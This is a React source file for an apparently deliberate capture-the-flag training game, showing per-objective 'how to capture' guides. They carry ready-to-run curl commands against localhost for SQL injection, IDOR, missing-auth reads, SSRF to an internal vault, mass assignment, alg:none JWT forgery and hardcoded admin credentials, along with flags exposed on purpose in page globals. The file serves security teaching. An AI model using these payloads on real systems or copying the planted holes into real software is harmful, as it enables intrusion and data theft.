import { useCallback, useEffect, useState, type FormEvent } from 'react';
import { api, errorMessage, SCORE_CHANGED_EVENT, type Objective, type Post } from '../api';
import { useAuth } from '../auth';
import { formatCountdown, useNow, usePolling } from '../utils';
import { loadIntoTerminal } from './Terminal';
import { PostCard } from './PostCard';

const API = 'http://localhost:8080';

/**
 * Per-vulnerability capture guidance. Each objective's flag is reachable ONLY through its own
 * vulnerability — there is no universal leak any more (except the DataLeak objective, #15).
 * `command` is a ready-to-run line for the in-browser terminal.
 */
function captureGuide(o: Objective): { how: string; command?: string } {
  const post = o.targetPostId ?? 0;
  switch (o.vector) {
    case 'DataLeak':
      return { how: 'This endpoint leaks it to everyone — the flag is shown above (VULN #15).' };
    case 'Sqli':
      return {
        how: "Inject into the search so it dumps every post's hidden column; the flag is in the target post's systemNote.",
        command: `curl -G --data-urlencode "query=' OR 1=1 --" ${API}/api/posts/search`,
      };
    case 'Idor':
      return {
        how: "Read the post's private note by id — there is no ownership check.",
        command: `curl ${API}/api/posts/${post}/note`,
      };
    case 'MissingAuth':
      return {
        how: 'The unauthenticated internal read returns the note the public feed hides.',
        command: `curl ${API}/internal/posts/${post}`,
      };
    case 'Ssrf':
      return {
        how: 'The vault only answers from inside the network. Make the link-preview fetch it for you.',
        command: `curl -X POST ${API}/api/link-preview -H "Content-Type: application/json" -d '{"url":"http://game-service:8080/internal/vault/${o.id}"}'`,
      };
    case 'MassAssign':
      return {
        how: 'Create a post but forge the privileged "isTrending" field — the server echoes the decree\'s secret back in the response "systemNote".',
        command: `curl -X POST ${API}/api/posts -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"content":"forged decree","isTrending":true}'`,
      };
    case 'AdminEndpoint': {
      // The flag endpoint takes the OBJECTIVE id (o.id), not the target post id. $TOKEN is your session token.
      const command = `curl ${API}/api/objectives/${o.id}/flag -H "Authorization: Bearer $TOKEN"`;
      if (o.tipId === '13') {
        return {
          how: `The vault is admin-only, but the JWT signature is never checked. Forge an alg:none token with role=Admin, load it with  TOKEN=<forged>  in the terminal, then open objective #${o.id}:`,
          command,
        };
      }
      return {
        how: `The admin credentials are committed in plain text in docker-compose.yml (admin / admin1234). Use the top-bar "Sign in" with them, then open objective #${o.id} (the command uses the OBJECTIVE id, not the post id; $TOKEN is your admin session):`,
        command,
      };
    }
    case 'Xss':
      return {
        how: `The flag is loaded into a JS-only variable, never drawn on screen. Read it in the browser console: window.__trollnetNotices[${o.id}]  (or exfiltrate it with an injected inline script).`,
      };
  }
}

export function ObjectivesView({ onOpenTips, onOpenTip }: { onOpenTips: () => void; onOpenTip: (tipId: string) => void }) {
  const [objectives, setObjectives] = useState<Objective[]>([]);
  const [loaded, setLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const now = useNow(1000);

  const refresh = useCallback(() => {
    api
      .objectives()
      .then((items) => {
        setObjectives(items);
        setError(null);
      })
      .catch((err) => setError(errorMessage(err)))
      .finally(() => setLoaded(true));
  }, []);

  usePolling(refresh, 15_000);

  return (
    <div className="stack">
      <div className="intro">
        <h2>Objectives</h2>
        <p className="muted small">
          New trending posts appear regularly. Capture each objective's flag before the moderator reviews the
          post. First troll to submit the right flag gets the points.
        </p>
        <button className="link small" onClick={onOpenTips}>
          Stuck? Open the training tips
        </button>
      </div>

      {error && <p className="error">{error}</p>}
      {loaded && objectives.length === 0 && !error && (
        <p className="muted center">No active objectives. The next one is coming soon...</p>
      )}

      <div className="list">
        {objectives.map((o) => (
          <ObjectiveCard
            key={o.id}
            objective={o}
            now={now}
            onChanged={refresh}
            onOpenTip={onOpenTip}
          />
        ))}
      </div>
    </div>
  );
}

interface CardProps {
  objective: Objective;
  now: number;
  onChanged: () => void;
  onOpenTip: (tipId: string) => void;
}

function ObjectiveCard({ objective: o, now, onChanged, onOpenTip }: CardProps) {
  const { user } = useAuth();
  const [flag, setFlag] = useState('');
  const [revealFlag, setRevealFlag] = useState(false);
  const [result, setResult] = useState<{ ok: boolean; text: string } | null>(null);
  const [busy, setBusy] = useState(false);
  const [target, setTarget] = useState<Post | null>(null);
  const [showTarget, setShowTarget] = useState(false);

  const remaining = new Date(o.expiresAt).getTime() - now;
  const expired = !o.isCompleted && remaining <= 0;
  const open = !o.isCompleted && !expired;
  const guide = captureGuide(o);

  // VULN-SPOT #02: for XSS objectives, load the flag into a JS-only global that only in-page script can
  // read. It is never rendered, so the "capture" is to read it with the console or an injected payload.
  useEffect(() => {
    if (o.vector !== 'Xss' || !open) return;
    api
      .objectiveNotice(o.id)
      .then((n) => {
        const w = window as unknown as { __trollnetNotices?: Record<number, string> };
        (w.__trollnetNotices ??= {})[o.id] = n.flag;
      })
      .catch(() => {
        /* notice unavailable */
      });
  }, [o.id, o.vector, open]);

  async function toggleTarget() {
    if (!showTarget && target === null && o.targetPostId !== null) {
      try {
        const detail = await api.post(o.targetPostId);
        setTarget({ ...detail, commentCount: detail.comments.length });
      } catch (err) {
        setResult({ ok: false, text: errorMessage(err) });
        return;
      }
    }
    setShowTarget((v) => !v);
  }

  async function submit(e: FormEvent) {
    e.preventDefault();
    if (!user) return;
    setBusy(true);
    try {
      const res = await api.submitFlag(o.id, flag.trim());
      setResult({ ok: res.correct, text: res.message });
      if (res.correct) {
        setFlag('');
        window.dispatchEvent(new Event(SCORE_CHANGED_EVENT));
        onChanged();
      }
    } catch (err) {
      setResult({ ok: false, text: errorMessage(err) });
      onChanged();
    } finally {
      setBusy(false);
    }
  }

  return (
    <article className={`objective${open ? '' : ' closed'}`}>
      <header className="objective-header">
        <h3>{o.title}</h3>
        {o.isCompleted ? (
          <span className="muted small">captured by @{o.completedByUsername}</span>
        ) : expired ? (
          <span className="muted small">reviewed by moderator</span>
        ) : (
          <span className={remaining < 60_000 ? 'timer urgent' : 'timer'} aria-label="Time remaining">
            {formatCountdown(remaining)}
          </span>
        )}
      </header>

      <p className="muted small">
        objective #{o.id} · {o.category} · difficulty {o.difficulty}/3 · {o.points} pts
        {o.targetPostId !== null && <> · target post #{o.targetPostId}</>}
      </p>
      <p>{o.description}</p>

      {open && (
        <div className="capture-panel">
          {o.flag != null ? (
            /* VULN-SPOT #15 (DataLeak): this objective's flag really is handed out by the API. */
            <p className="accent-text small leaked-flag">
              Leaked flag:{' '}
              <span className={revealFlag ? '' : 'blurred'} title={revealFlag ? undefined : 'Blurred in the UI only'}>
                {o.flag}
              </span>{' '}
              <button className="link small" onClick={() => setRevealFlag((v) => !v)} aria-expanded={revealFlag}>
                {revealFlag ? 'Hide' : 'Reveal'}
              </button>
            </p>
          ) : (
            <>
              <p className="muted small">
                <strong>How to capture:</strong> {guide.how}
              </p>
              {guide.command && (
                <p className="capture-cmd">
                  <code>{guide.command}</code>{' '}
                  <button className="link small" onClick={() => loadIntoTerminal(guide.command!)}>
                    Run in terminal
                  </button>
                </p>
              )}
            </>
          )}
        </div>
      )}

      <div className="objective-actions">
        <button className="link small" onClick={() => onOpenTip(o.tipId)}>
          Need a hint? (#{o.tipId})
        </button>
        {o.targetPostId !== null && open && (
          <button className="link small" onClick={toggleTarget} aria-expanded={showTarget}>
            {showTarget ? 'Hide target post' : `Show target post #${o.targetPostId}`}
          </button>
        )}
      </div>
      {showTarget && target && <PostCard post={target} initiallyExpanded />}

      {open && (
        <form className="flag-form" onSubmit={submit}>
          <input
            placeholder="TROLL{...}"
            value={flag}
            maxLength={100}
            onChange={(e) => setFlag(e.target.value)}
            aria-label="Flag"
          />
          <button className="primary" type="submit" disabled={busy || !user || !flag.trim()}>
            Submit flag
          </button>
        </form>
      )}
      {result && <p className={result.ok ? 'success-text' : 'error'}>{result.text}</p>}
    </article>
  );
}
